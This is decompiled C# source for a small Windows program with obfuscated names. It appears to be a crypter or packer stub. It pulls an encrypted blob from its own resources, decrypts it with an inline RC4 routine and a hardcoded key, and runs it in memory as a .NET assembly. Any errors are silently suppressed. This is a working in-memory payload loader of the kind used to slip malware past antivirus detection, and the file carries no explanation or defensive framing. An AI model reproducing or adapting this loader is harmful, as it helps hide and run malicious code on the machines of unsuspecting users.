using System;
using System.Collections;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication1;

[StandardModule]
internal sealed class jajaarhaahr
{
	[STAThread]
	public static void Main()
	{
		try
		{
			new ArrayList();
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(" ".Replace(" ", Application.get_ExecutablePath()));
			byte[] byte_ = yo(stringBuilder.ToString());
			NewLateBinding.LateCall(NewLateBinding.LateGet((object)Assembly.Load((byte[])deca(ref byte_)), (Type)null, "EntryPoint", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Invoke", new object[2] { null, null }, (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] yo(string file)
	{
		IntPtr hModule = LoadLibraryA(ref file);
		IntPtr hResInfo = FindResource(hModule, "0", "RT_RCDATA");
		IntPtr source = LoadResource(hModule, hResInfo);
		int num = SizeofResource(hModule, hResInfo);
		byte[] array = new byte[checked(num - 1 + 1)];
		Marshal.Copy(source, array, 0, num);
		return array;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

	public static object deca(ref byte[] byte_0)
	{
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int length = byte_0.GetLength(0);
		int length2 = array.GetLength(0);
		int num = 0;
		int num2;
		int num3;
		checked
		{
			do
			{
				array2[num] = (byte)num;
				array3[num] = array[unchecked(num % length2)];
				num++;
			}
			while (num <= 255);
			num2 = 0;
			num = 0;
			do
			{
				unchecked
				{
					num2 = checked(num2 + unchecked((int)array2[num]) + unchecked((int)array3[num])) % 256;
					byte b = array2[num];
					array2[num] = array2[num2];
					array2[num2] = b;
				}
				num++;
			}
			while (num <= 255);
			num2 = 0;
			num = 0;
			num3 = length - 1;
		}
		for (int i = 0; i <= num3; i = checked(i + 1))
		{
			num = checked(num + 1) % 256;
			num2 = checked(num2 + unchecked((int)array2[num])) % 256;
			byte b = array2[num];
			array2[num] = array2[num2];
			array2[num2] = b;
			int num4 = checked(unchecked((int)array2[num]) + unchecked((int)array2[num2])) % 256;
			byte_0[i] = (byte)(byte_0[i] ^ array2[num4]);
		}
		return byte_0;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	public static object loada(byte[] byta)
	{
		return Assembly.Load(byta);
	}
}
